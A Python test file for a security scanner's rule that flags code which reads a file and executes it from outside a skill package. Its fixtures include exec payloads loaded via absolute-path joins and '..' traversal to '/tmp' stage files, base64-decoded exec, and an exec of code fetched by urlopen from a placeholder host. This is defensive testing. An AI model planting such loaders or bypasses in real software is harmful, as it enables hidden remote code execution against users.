"""B-752 — a `__file__` token is not proof the path stays inside the artifact.

The carve-out that stops `exec(open(<path>).read().decode())` from reading as
`OBFUSCATED_EXEC` asked one question: does the path expression mention `__file__`? An
attacker writes that token as easily as an author does, so the exemption absolved reading
and executing code from OUTSIDE the skill — a false CLEAN, which this project ranks worse
than a false FAIL.

Two escapes are now refused, and both are provable from the source text alone:

* a literal ABSOLUTE segment passed to a path join, because `os.path.join(a, b, "/x")`
  resolves to `/x` — the anchor is discarded and no traversal is needed;
* `..` segments that climb past the anchor's own depth below the artifact root, which is
  knowable because every production caller of `analyze_python()` passes the scanned file's
  relpath.

WHAT THIS FILE IS FOR, beyond the two families above: the fix NARROWS an exemption, so its
whole risk runs the other way — a benign skill that now FAILs. FOUR such shapes were
produced while writing it, all four by one mistake worn at different depths: reading the
path expression for slashes and dots instead of resolving it as a path. Two of the four
convicted defensive code — a sanitiser stripping `/`, and a sanitiser stripping `..` — so
those drafts FAILed the code written to prevent the very attack they hunt. The fourth
convicted a path that cancels itself (`assets/../data`) and goes nowhere. Every one is
pinned below.

A fifth defect ran the opposite way and is pinned too: crediting the anchor once in the
depth calculation and again as a walked segment re-absolved a real escape.

None of the five was found by reading the diff. In order: testing the wired verdict rather
than the helper; probing the rule with ordinary code; an adversarial pass run after two
rounds had already declared the family closed; that pass's remaining families, read only
after the first fix had been committed; and a matrix re-run of controls that had passed a
round earlier.

Offline, read-only, stdlib only.
"""
from __future__ import annotations

from clawseccheck.skillast import analyze_python


def _convicts(src: str, relpath: str = "pkg/mod.py") -> bool:
    """True when the analyzer returns a crit-severity finding for *src*."""
    return any(f.severity == "crit" for f in analyze_python(src, relpath))


def _exec_reading(path_expr: str, prelude: str = "") -> str:
    """A skill file that reads one path and execs it — the shape the carve-out covers."""
    return (
        "import os\n"
        "from pathlib import Path\n"
        f"{prelude}"
        f"with open({path_expr}, \"rb\") as fh:\n"
        "    exec(fh.read().decode(\"utf-8\"), {})\n"
    )


# ---------------------------------------------------------------------------
# Benign — the exemption must survive. These are the false-FAIL guards.
# ---------------------------------------------------------------------------


def test_a_sibling_file_inside_the_artifact_is_still_exempt():
    """The idiom the carve-out exists for: setup.py reading its own `__version__.py`."""
    assert not _convicts(
        _exec_reading('os.path.join(os.path.dirname(__file__), "data", "v.py")')
    )


def test_one_level_up_from_a_nested_file_stays_inside_and_is_exempt():
    """`pkg/mod.py` reading `../shared/v.py` lands at the artifact root, not outside it.

    The count alone cannot decide this — two `..` from `a/b/mod.py` is still inside, one
    `..` from a root-level file is already outside. That is why the anchor's depth is
    computed rather than assumed.
    """
    assert not _convicts(
        _exec_reading('os.path.join(here, "..", "shared", "v.py")',
                      prelude="here = os.path.dirname(__file__)\n"),
        relpath="pkg/mod.py",
    )


def test_a_slash_used_as_a_separator_is_not_an_absolute_segment():
    """REGRESSION PIN. The first draft convicted this, and it is ordinary code.

    `"/".join([...])` contains a string starting with a slash, and reading the expression
    for slashes rather than for path SEGMENTS turned that into a DO-NOT-INSTALL verdict on
    a skill doing nothing wrong.
    """
    assert not _convicts(
        _exec_reading('os.path.join(here, name)',
                      prelude='here = os.path.dirname(__file__)\n'
                              'name = "/".join(["data", "v.py"])\n')
    )


def test_sanitising_a_name_with_replace_is_not_an_absolute_segment():
    """REGRESSION PIN, and the sharper of the two: the first draft convicted code that
    strips separators out of an untrusted name — punishing the defensive habit."""
    assert not _convicts(
        "import os\n"
        "def load(raw):\n"
        "    here = os.path.dirname(__file__)\n"
        '    with open(os.path.join(here, raw.replace("/", "_")), "rb") as fh:\n'
        '        exec(fh.read().decode("utf-8"), {})\n'
    )


def test_a_relative_literal_containing_slashes_is_still_exempt():
    """`"sub/dir/v.py"` is a path segment with separators in it, not an absolute path."""
    assert not _convicts(
        _exec_reading('os.path.join(os.path.dirname(__file__), "sub/dir/v.py")')
    )


# ---------------------------------------------------------------------------
# Escapes — the exemption must be refused.
# ---------------------------------------------------------------------------


def test_an_absolute_segment_discards_the_anchor_and_convicts():
    """`os.path.join(dirname(__file__), "assets", "/tmp/x.py")` resolves to `/tmp/x.py`.

    No traversal, no obfuscation: one extra argument. This is the cheapest bypass of a
    token-presence check and the reason the fix exists.
    """
    assert _convicts(
        _exec_reading('os.path.join(here, "assets", "/tmp/.cache/stage2.py")',
                      prelude="here = os.path.dirname(__file__)\n")
    )


def test_an_absolute_segment_parked_in_a_variable_convicts():
    assert _convicts(
        _exec_reading('os.path.join(here, seg)',
                      prelude='here = os.path.dirname(__file__)\n'
                              'seg = "/tmp/stage2.py"\n')
    )


def test_pathlib_slash_and_joinpath_forms_convict():
    """Both pathlib spellings, because the attacker picks the spelling."""
    assert _convicts(
        _exec_reading('p', prelude='p = Path(__file__).parent / "/tmp/stage2.py"\n')
    )
    assert _convicts(
        _exec_reading('p', prelude='p = Path(__file__).parent.joinpath("/tmp/stage2.py")\n')
    )


def test_traversal_past_the_artifact_root_convicts():
    assert _convicts(
        _exec_reading('os.path.join(here, "..", "..", "..", "tmp", "s.py")',
                      prelude="here = os.path.dirname(__file__)\n"),
        relpath="pkg/mod.py",
    )


def test_traversal_inside_a_single_literal_convicts():
    """The segments do not have to be separate arguments to be counted."""
    assert _convicts(
        _exec_reading('os.path.join(os.path.dirname(__file__), "../../../x.py")'),
        relpath="pkg/mod.py",
    )


# ---------------------------------------------------------------------------
# The wiring, not the helper.
# ---------------------------------------------------------------------------


def test_the_same_source_convicts_or_not_depending_on_where_the_file_sits():
    """The load-bearing wiring test.

    The depth arithmetic is only reached if `analyze_python`'s `filename` actually
    travels down three helper calls to the predicate. An assertion on the predicate alone
    passes even when that threading is broken — which is exactly how the first draft
    shipped a rule that never fired: the helper's own unit cases handed it the anchor
    directly, so they were green while the wired verdict was unchanged.
    """
    src = _exec_reading('os.path.join(here, "..", "x.py")',
                        prelude="here = os.path.dirname(__file__)\n")
    assert not _convicts(src, relpath="pkg/mod.py")   # one up, room to spare
    assert _convicts(src, relpath="mod.py")           # one up from the root: outside


def test_an_unknown_relpath_never_invents_an_escape():
    """A caller that cannot say where the file sits gets the old behaviour.

    Guessing here would convict on no evidence, which is the failure this whole change is
    trying to remove — in the other direction.
    """
    src = _exec_reading('os.path.join(here, "..", "..", "..", "tmp", "s.py")',
                        prelude="here = os.path.dirname(__file__)\n")
    assert _convicts(src, relpath="mod.py")
    assert not _convicts(src, relpath="")


def test_the_untouched_controls_still_convict():
    """Non-vacuity for the whole file: the rules this change does not touch still fire, so
    a green run here is not the analyzer having stopped working."""
    assert _convicts(
        "from base64 import b64decode\n"
        'exec(b64decode("cHJpbnQoMSk="), {})\n'
    )
    assert _convicts(
        "from urllib.request import urlopen\n"
        'exec(urlopen("http://x/y").read().decode(), {})\n'
    )


# ---------------------------------------------------------------------------
# Found by the adversarial pass, after two drafts had already "fixed" this family.
# ---------------------------------------------------------------------------


def test_a_traversal_sanitiser_is_not_a_traversal():
    """REGRESSION PIN, and the third instance of one family.

    `raw.replace("..", "_")` is the OWASP-recommended defence against path traversal. The
    second draft counted that `".."` as a path component and convicted the sanitiser —
    i.e. it FAILed the code written to prevent the very attack it hunts.

    ASSERTED AT THREE DEPTHS ON PURPOSE. This file's `_convicts()` default is
    `pkg/mod.py`, where the arithmetic is `ups(1) > anchor_depth(1)` — false. The defect
    was therefore invisible at the default and only appeared at the artifact root, which
    is the commonest small-skill layout (a `SKILL.md` and one top-level `.py`). A guard
    pinned at one convenient depth is a guard that agrees with whatever the code does.
    """
    src = (
        "import os\n"
        "here = os.path.dirname(__file__)\n"
        'name = raw_name.replace("..", "_")\n'
        'with open(os.path.join(here, name), "rb") as f:\n'
        "    exec(f.read().decode())\n"
    )
    for relpath in ("mod.py", "pkg/mod.py", "a/b/mod.py"):
        assert not _convicts(src, relpath), relpath


def test_a_traversal_guard_expression_is_not_a_traversal():
    """The comparator spelling of the same defence: `".." not in raw`."""
    assert not _convicts(
        "import os\n"
        "here = os.path.dirname(__file__)\n"
        'name = raw if ".." not in raw else "_"\n'
        'with open(os.path.join(here, name), "rb") as f:\n'
        "    exec(f.read().decode())\n",
        relpath="mod.py",
    )


def test_nested_dirname_climbs_two_components_not_one():
    """`dirname(dirname(__file__))` starts two levels up, so three `..` leave the root.

    Counting the wrapper once over-stated the anchor's depth and absolved a real escape.
    That is the under-convicting direction — it opened no false FAIL, which is exactly why
    only an adversarial pass hunting BOTH directions would find it.
    """
    assert _convicts(
        "import os\n"
        "here = os.path.dirname(os.path.dirname(__file__))\n"
        'with open(os.path.join(here, "..", "..", "..", "tmp", "s.py"), "rb") as f:\n'
        "    exec(f.read().decode())\n",
        relpath="a/b/tests/conftest.py",
    )


# ---------------------------------------------------------------------------
# Counting tokens is not walking a path. Found after the first fix was committed.
# ---------------------------------------------------------------------------


def test_a_traversal_that_cancels_itself_stays_inside():
    """REGRESSION PIN. `join(here, "assets", "..", "data", "v.py")` goes nowhere.

    The `..` cancels `assets`; the read never leaves the artifact. Summing raw `..`
    tokens convicted it, and every net-zero variant with it — two cancels, and the same
    path written as one combined literal. HEAD absolves all three, so this was damage the
    fix introduced rather than a pre-existing gap.

    The repair is to WALK the segments and ask whether the depth ever goes negative,
    which is the difference between counting a token and resolving a path.
    """
    for expr in (
        'os.path.join(here, "assets", "..", "data", "v.py")',
        'os.path.join(here, "assets/../data/v.py")',
        'os.path.join(here, "pkg", "..", "pkg2", "..", "data", "v.py")',
    ):
        assert not _convicts(
            _exec_reading(expr, prelude="here = os.path.dirname(__file__)\n"),
            relpath="mod.py",
        ), expr


def test_a_cancel_followed_by_a_real_escape_still_convicts():
    """The walk must not be fooled in the other direction either: cancelling once and
    then climbing out is still climbing out."""
    assert _convicts(
        _exec_reading('os.path.join(here, "a", "..", "..", "..", "tmp", "s.py")',
                      prelude="here = os.path.dirname(__file__)\n"),
        relpath="mod.py",
    )


def test_the_anchor_is_not_counted_twice():
    """REGRESSION PIN for the repair's own first draft.

    The anchor's position is carried by the depth calculation, so pushing the anchor
    expression through the segment walk as well credits it twice — which silently
    cancelled one `..` and re-absolved a genuine escape from a root-level file. Caught by
    a control that had passed in the previous round, which is the only reason it did not
    ship: a matrix re-run beats re-reading the diff.
    """
    assert _convicts(
        _exec_reading('os.path.join(here, "..", "x.py")',
                      prelude="here = os.path.dirname(__file__)\n"),
        relpath="mod.py",
    )
